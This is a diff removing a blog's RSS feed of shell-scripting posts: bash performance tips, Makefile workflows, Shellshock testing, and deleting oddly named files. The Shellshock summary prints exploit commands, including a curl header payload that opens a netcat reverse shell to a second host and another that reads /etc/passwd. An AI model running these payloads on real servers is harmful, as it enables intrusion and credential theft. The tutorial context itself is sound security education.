@@ -1,674 +1,678 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SHELL on Ricky</title><link>https://linzeyan.github.io/categories/shell/</link><description>Recent content in SHELL on Ricky</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Wed, 25 Sep 2024 09:23:00 +0800</lastBuildDate><atom:link href="https://linzeyan.github.io/categories/shell/index.xml" rel="self" type="application/rss+xml"/><item><title>Advanced Shell Scripting Techniques: Automating Complex Tasks with Bash</title><link>https://linzeyan.github.io/posts/2024/20240925-advanced-shell-scripting/</link><pubDate>Wed, 25 Sep 2024 09:23:00 +0800</pubDate><guid>https://linzeyan.github.io/posts/2024/20240925-advanced-shell-scripting/</guid><description>&lt;ul>
-&lt;li>&lt;a href="https://omid.dev/2024/06/19/advanced-shell-scripting-techniques-automating-complex-tasks-with-bash/" target="_blank" rel="noopener">Advanced Shell Scripting Techniques: Automating Complex Tasks with Bash&lt;/a>&lt;/li>
-&lt;/ul>
-&lt;h4 id="use-built-in-commands">Use Built-in Commands&lt;/h4>
-&lt;div class="alert info">
-&lt;span>&lt;i data-feather="info">&lt;/i>&lt;/span>
-&lt;span>&lt;strong>Built-in commands execute faster because they don&amp;rsquo;t require loading an external process.&lt;/strong>&lt;/span>
-&lt;/div>
-&lt;h4 id="minimize-subshells">Minimize Subshells&lt;/h4>
-&lt;div class="alert info">
-&lt;span>&lt;i data-feather="info">&lt;/i>&lt;/span>
-&lt;span>&lt;strong>Subshells can be expensive in terms of performance.&lt;/strong>&lt;/span>
-&lt;/div>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Inefficient&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>output&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">$(&lt;/span>cat file.txt&lt;span style="color:#66d9ef">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Efficient&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>output&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">$(&lt;/span>&amp;lt;file.txt&lt;span style="color:#66d9ef">)&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="use-arrays-for-bulk-data">Use Arrays for Bulk Data&lt;/h4>
-&lt;div class="alert info">
-&lt;span>&lt;i data-feather="info">&lt;/i>&lt;/span>
-&lt;span>&lt;strong>When handling a large amount of data, arrays can be more efficient and easier to manage than multiple variables.&lt;/strong>&lt;/span>
-&lt;/div>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Inefficient&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>item1&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;apple&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>item2&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;banana&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>item3&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;cherry&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Efficient&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>items&lt;span style="color:#f92672">=(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;apple&amp;#34;&lt;/span> &lt;span style="color:#e6db74">&amp;#34;banana&amp;#34;&lt;/span> &lt;span style="color:#e6db74">&amp;#34;cherry&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> item in &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>items[@]&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>; &lt;span style="color:#66d9ef">do&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> echo &lt;span style="color:#e6db74">&amp;#34;&lt;/span>$item&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">done&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="enable-noclobber">Enable Noclobber&lt;/h4>
-&lt;div class="alert info">
-&lt;span>&lt;i data-feather="info">&lt;/i>&lt;/span>
-&lt;span>&lt;strong>To prevent accidental overwriting of files.&lt;/strong>&lt;/span>
-&lt;/div>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>set -o noclobber
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="use-functions">Use Functions&lt;/h4>
-&lt;div class="alert info">
-&lt;span>&lt;i data-feather="info">&lt;/i>&lt;/span>
-&lt;span>&lt;strong>Functions allow you to encapsulate and reuse code, making scripts cleaner and reducing redundancy.&lt;/strong>&lt;/span>
-&lt;/div>
-&lt;h4 id="efficient-file-operations">Efficient File Operations&lt;/h4>
-&lt;div class="alert info">
-&lt;span>&lt;i data-feather="info">&lt;/i>&lt;/span>
-&lt;span>&lt;strong>When performing file operations, use efficient techniques to minimize resource usage.&lt;/strong>&lt;/span>
-&lt;/div>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Inefficient&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span> read -r line; &lt;span style="color:#66d9ef">do&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> echo &lt;span style="color:#e6db74">&amp;#34;&lt;/span>$line&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">done&lt;/span> &amp;lt; file.txt
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Efficient&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span> IFS&lt;span style="color:#f92672">=&lt;/span> read -r line; &lt;span style="color:#66d9ef">do&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> echo &lt;span style="color:#e6db74">&amp;#34;&lt;/span>$line&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">done&lt;/span> &amp;lt; file.txt
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="parallel-processing">Parallel Processing&lt;/h4>
-&lt;div class="alert info">
-&lt;span>&lt;i data-feather="info">&lt;/i>&lt;/span>
-&lt;span>&lt;strong>Tools like &lt;code>xargs&lt;/code> and GNU &lt;code>parallel&lt;/code> can be incredibly useful.&lt;/strong>&lt;/span>
-&lt;/div>
-&lt;h4 id="error-handling">Error Handling&lt;/h4>
-&lt;div class="alert info">
-&lt;span>&lt;i data-feather="info">&lt;/i>&lt;/span>
-&lt;span>&lt;strong>Robust error handling is critical for creating reliable and maintainable scripts.&lt;/strong>&lt;/span>
-&lt;/div>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Exit on Error: Using set -e ensures that your script exits immediately if any command fails, preventing cascading errors.&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>set -e
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Custom Error Messages: Implement custom error messages to provide more context when something goes wrong.&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>command1 &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">{&lt;/span> echo &lt;span style="color:#e6db74">&amp;#34;command1 failed&amp;#34;&lt;/span>; exit 1; &lt;span style="color:#f92672">}&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Trap Signals: Use the `trap` command to catch and handle signals and errors gracefully.&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>trap &lt;span style="color:#e6db74">&amp;#39;echo &amp;#34;Error occurred&amp;#34;; cleanup; exit 1&amp;#39;&lt;/span> ERR
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">function&lt;/span> cleanup&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Cleanup code&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Validate Inputs: Always validate user inputs and script arguments to prevent unexpected behavior.&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">[[&lt;/span> -z &lt;span style="color:#e6db74">&amp;#34;&lt;/span>$1&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">]]&lt;/span>; &lt;span style="color:#66d9ef">then&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> echo &lt;span style="color:#e6db74">&amp;#34;Usage: &lt;/span>$0&lt;span style="color:#e6db74"> &amp;lt;argument&amp;gt;&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit &lt;span style="color:#ae81ff">1&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">fi&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Logging: Implement logging to keep track of script execution and diagnose issues.&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>logfile&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;script.log&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>exec &amp;gt; &amp;gt;&lt;span style="color:#f92672">(&lt;/span>tee -i $logfile&lt;span style="color:#f92672">)&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>exec 2&amp;gt;&amp;amp;&lt;span style="color:#ae81ff">1&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>echo &lt;span style="color:#e6db74">&amp;#34;Script started&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="automating-complex-system-administration-tasks">Automating Complex System Administration Tasks:&lt;/h4>
-&lt;ol>
-&lt;li>Automated Backups&lt;/li>
-&lt;li>System Monitoring&lt;/li>
-&lt;li>User Management&lt;/li>
-&lt;li>Automated Updates&lt;/li>
-&lt;li>Network Configuration&lt;/li>
-&lt;/ol></description></item><item><title>Makefiles for Web Projects: Manage Your Environment Workflow</title><link>https://linzeyan.github.io/posts/2024/20240805-use-makefile-to-manage-workflows-for-web-projects/</link><pubDate>Mon, 05 Aug 2024 17:21:24 +0800</pubDate><guid>https://linzeyan.github.io/posts/2024/20240805-use-makefile-to-manage-workflows-for-web-projects/</guid><description>&lt;ul>
-&lt;li>&lt;a href="https://blog.goodjack.tw/2023/01/use-makefile-to-manage-workflows-for-web-projects.html" target="_blank" rel="noopener">Makefiles for Web Projects: Manage Your Environment Workflow&lt;/a>&lt;/li>
-&lt;li>&lt;a href="https://gagor.pro/2024/02/how-i-stopped-worrying-and-loved-makefiles/" target="_blank" rel="noopener">How I stopped worrying and loved Makefiles&lt;/a>&lt;/li>
-&lt;/ul>
-&lt;p>&lt;strong>Note: Makefile indentation must use tabs, otherwise you&amp;rsquo;ll get syntax errors.&lt;/strong>&lt;/p>
-&lt;h2 id="the-core-of-a-makefile-targets">The Core of a Makefile: Targets&lt;/h2>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-makefile" data-lang="makefile">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">up&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cp .env.example .env
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> docker compose up -d workspace
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">stop&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> docker compose stop
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">zsh&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> docker compose exec workspace zsh
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
-&lt;li>This example has three targets: &lt;code>up&lt;/code>, &lt;code>stop&lt;/code>, and &lt;code>zsh&lt;/code>. By default, Make treats the first target as the &lt;a href="https://www.gnu.org/software/make/manual/html_node/Goals.html" target="_blank" rel="noopener">Goal&lt;/a> (it cannot start with a dot), which is the project&amp;rsquo;s primary workflow. In this case, &lt;code>make&lt;/code> and &lt;code>make up&lt;/code> do the same thing.&lt;/li>
-&lt;li>But the copy step above is not a typical Make use case. Make shines at deciding whether each target needs to run. For example, we often store secrets in &lt;code>.env&lt;/code>. If &lt;code>.env&lt;/code> already exists, we shouldn&amp;rsquo;t overwrite it by copying &lt;code>.env.example&lt;/code> again. In that case, we can make &lt;code>.env&lt;/code> a target:&lt;/li>
-&lt;/ul>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-makefile" data-lang="makefile">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">up&lt;/span>&lt;span style="color:#f92672">:&lt;/span> .env
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> docker compose up -d workspace
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">.env&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cp .env.example .env
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
-&lt;li>By default, target names are treated as filenames. The name &amp;ldquo;make&amp;rdquo; implies building a target; it will only execute the target&amp;rsquo;s recipe when the conditions are met (like the file not existing).
-&lt;ul>
-&lt;li>In this example, when you run the &lt;code>up&lt;/code> target, if &lt;code>.env&lt;/code> doesn&amp;rsquo;t exist it will run the &lt;code>.env&lt;/code> target first to create it, then start the workspace container. If &lt;code>.env&lt;/code> already exists, it skips the &lt;code>.env&lt;/code> target and starts the container directly.&lt;/li>
-&lt;li>Likewise, if there is a file named &lt;code>up&lt;/code> in the directory, the &lt;code>up&lt;/code> target won&amp;rsquo;t run. You can define &lt;a href="https://www.gnu.org/software/make/manual/html_node/Phony-Targets.html" target="_blank" rel="noopener">Phony Targets&lt;/a> to tell Make that certain targets aren&amp;rsquo;t filenames, but named workflows instead:&lt;/li>
-&lt;/ul>
-&lt;/li>
-&lt;/ul>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-makefile" data-lang="makefile">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">.PHONY&lt;/span>&lt;span style="color:#f92672">:&lt;/span> up stop zsh
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="add-some-variables">Add Some Variables&lt;/h2>
-&lt;p>Make supports variables (&lt;a href="https://www.gnu.org/software/make/manual/html_node/Setting.html" target="_blank" rel="noopener">Variable&lt;/a>). Following common Unix environment variable conventions, we usually write them in SCREAMING_SNAKE_CASE. When used, variables are wrapped in &lt;code>$()&lt;/code>.&lt;/p></description></item><item><title>Test Whether a Server Is Vulnerable to Shellshock Bug</title><link>https://linzeyan.github.io/posts/2022/20221128-linux-shellshock-bug/</link><pubDate>Mon, 28 Nov 2022 15:35:30 +0800</pubDate><guid>https://linzeyan.github.io/posts/2022/20221128-linux-shellshock-bug/</guid><description>&lt;ul>
-&lt;li>&lt;a href="https://www.baeldung.com/linux/shellshock-bug" target="_blank" rel="noopener">Test Whether a Server Is Vulnerable to Shellshock Bug&lt;/a>&lt;/li>
-&lt;/ul>
-&lt;h5 id="the-shellshock-bug">The Shellshock Bug&lt;/h5>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>env x&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39; () {:;};&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h5 id="exploiting-shellshock-bug">Exploiting Shellshock Bug&lt;/h5>
-&lt;ul>
-&lt;li>A substituted command is executed since the feature ignores the command specified by the user, and instead, it runs that which the ForceCommand defines.&lt;/li>
-&lt;li>The ignored commands from the user are put in the &amp;ldquo;SSH_ORIGINAL_COMMAND&amp;rdquo; environment variable. If the user&amp;rsquo;s default shell is Bash, the Bash shell will parse the value of the &amp;ldquo;SSH_ORIGINAL_COMMAND&amp;rdquo; environment variable on start-up and run the embedded commands.&lt;/li>
-&lt;/ul>
-&lt;h5 id="examples-of-shellshock-exploit-commands">Examples of Shellshock Exploit Commands&lt;/h5>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">## 1&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl -H &lt;span style="color:#e6db74">&amp;#34;X-Frame-Options: () {:;};echo;/bin/nc -e /bin/bash 192.168.y.y 443&amp;#34;&lt;/span> 192.168.x.y/CGI-bin/hello.cgi
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">## 2&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl --insecure 192.168.x.x -H &lt;span style="color:#e6db74">&amp;#34;User-Agent: () { :; }; /bin/cat /etc/passwd&amp;#34;&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
-&lt;li>use nmap script to test for the vulnerability&lt;/li>
-&lt;/ul>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nmap -sV -p- --script http-shellshock 192.168.x.x
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap -sV -p- --script http-shellshock --script-args uri&lt;span style="color:#f92672">=&lt;/span>/cgi-bin/bin,cmd&lt;span style="color:#f92672">=&lt;/span>ls 192.168.x.x
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>How to Delete Files With Names That Contain Non-printable Characters</title><link>https://linzeyan.github.io/posts/2022/20221114-delete-files-non-printable-characters/</link><pubDate>Mon, 14 Nov 2022 13:55:17 +0800</pubDate><guid>https://linzeyan.github.io/posts/2022/20221114-delete-files-non-printable-characters/</guid><description>&lt;ul>
-&lt;li>&lt;a href="https://www.baeldung.com/linux/delete-files-non-printable-characters" target="_blank" rel="noopener">How to Delete Files With Names That Contain Non-printable Characters&lt;/a>&lt;/li>
-&lt;/ul>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ls -l
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>total &lt;span style="color:#ae81ff">13&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- &lt;span style="color:#ae81ff">1&lt;/span> ZZ &lt;span style="color:#ae81ff">197121&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> Nov &lt;span style="color:#ae81ff">6&lt;/span> 07:08 &lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- &lt;span style="color:#ae81ff">1&lt;/span> ZZ &lt;span style="color:#ae81ff">197121&lt;/span> &lt;span style="color:#ae81ff">162&lt;/span> Apr &lt;span style="color:#ae81ff">16&lt;/span> &lt;span style="color:#ae81ff">2022&lt;/span> &lt;span style="color:#e6db74">&amp;#39;~$iscord.docx&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- &lt;span style="color:#ae81ff">1&lt;/span> ZZ &lt;span style="color:#ae81ff">197121&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span> Nov &lt;span style="color:#ae81ff">6&lt;/span> 06:03 &lt;span style="color:#e6db74">&amp;#39;&amp;#39;$&amp;#39;\302\226&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- &lt;span style="color:#ae81ff">1&lt;/span> ZZ &lt;span style="color:#ae81ff">197121&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> Nov &lt;span style="color:#ae81ff">6&lt;/span> 06:01 &lt;span style="color:#e6db74">&amp;#39;&amp;#39;$&amp;#39;\302\226&amp;#39;&amp;#39;Λ---ω&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- &lt;span style="color:#ae81ff">1&lt;/span> ZZ &lt;span style="color:#ae81ff">197121&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> Nov &lt;span style="color:#ae81ff">6&lt;/span> 06:13 &lt;span style="color:#e6db74">&amp;#39;␴?␴??␴??::␴?␴&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- &lt;span style="color:#ae81ff">1&lt;/span> ZZ &lt;span style="color:#ae81ff">197121&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> Nov &lt;span style="color:#ae81ff">6&lt;/span> 06:12 ␴__␴
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- &lt;span style="color:#ae81ff">1&lt;/span> ZZ &lt;span style="color:#ae81ff">197121&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> Nov &lt;span style="color:#ae81ff">6&lt;/span> 06:14 ␴␴␴␴␴␴␴␴␴␴␴␴␴␴␴␴␴
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- &lt;span style="color:#ae81ff">1&lt;/span> ZZ &lt;span style="color:#ae81ff">197121&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> Nov &lt;span style="color:#ae81ff">6&lt;/span> 06:18 &lt;span style="color:#e6db74">&amp;#39;␴ω␴␴␣␦&amp;#39;$&amp;#39;\342\220\264&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- &lt;span style="color:#ae81ff">1&lt;/span> ZZ &lt;span style="color:#ae81ff">197121&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> Nov &lt;span style="color:#ae81ff">6&lt;/span> 06:16 ␣␣␣␣␣␣␣␣
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- &lt;span style="color:#ae81ff">1&lt;/span> ZZ &lt;span style="color:#ae81ff">197121&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> Nov &lt;span style="color:#ae81ff">6&lt;/span> 06:26 ␣ μ μ Ω Ω
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- &lt;span style="color:#ae81ff">1&lt;/span> ZZ &lt;span style="color:#ae81ff">197121&lt;/span> &lt;span style="color:#ae81ff">14&lt;/span> Nov &lt;span style="color:#ae81ff">6&lt;/span> 06:23 &lt;span style="color:#e6db74">&amp;#39;␣ μ ␴&amp;#39;$&amp;#39;\342\220\264&amp;#39;&amp;#39;Ξ&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- &lt;span style="color:#ae81ff">1&lt;/span> ZZ &lt;span style="color:#ae81ff">197121&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> Nov &lt;span style="color:#ae81ff">6&lt;/span> 06:27
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rw-r--r-- &lt;span style="color:#ae81ff">1&lt;/span> ZZ &lt;span style="color:#ae81ff">197121&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> Nov &lt;span style="color:#ae81ff">6&lt;/span> 06:27
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h5 id="using-ansi-c-quoting">Using ANSI-C Quoting&lt;/h5>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Using ANSI-C Quoting&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>rm &lt;span style="color:#e6db74">&amp;#39;&amp;#39;$&amp;#39;\302\226&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># We can also use the $ special character before enclosing the filename in single quotes&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>rm &lt;span style="color:#e6db74">$&amp;#39;\356\200\215&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># pass an item&amp;#39;s name to rm without using the ANSI-C quoting&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>rm &lt;span style="color:#e6db74">&amp;#39;\026\033&amp;#39;&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>rm: cannot remove &lt;span style="color:#e6db74">&amp;#39;\026\033&amp;#39;&lt;/span>: No such file or directory
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h5 id="using-inode-numbers">Using Inode Numbers&lt;/h5>
-&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ls -li
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>total &lt;span style="color:#ae81ff">11&lt;/span>
-&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
